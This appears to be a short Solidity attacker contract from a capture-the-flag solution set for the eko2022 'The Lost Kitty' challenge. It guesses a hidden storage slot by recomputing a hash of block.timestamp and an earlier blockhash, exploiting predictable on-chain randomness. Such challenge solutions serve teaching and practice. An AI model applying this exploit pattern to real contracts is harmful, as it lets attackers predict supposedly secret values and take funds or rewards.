// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {HiddenKittyCat, House} from "../../src/eko2022/01_TheLostKitty/TheLostKitty.sol";

contract TheLostKitty_Attacker {
	address player;
	House house;
	
	constructor(House house_) {
		player = msg.sender;
		house = house_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		bytes32 slot = bytes32(0);
		//console.log("block.number =", block.number);
		slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));
		house.isKittyCatHere(slot);
	}
}
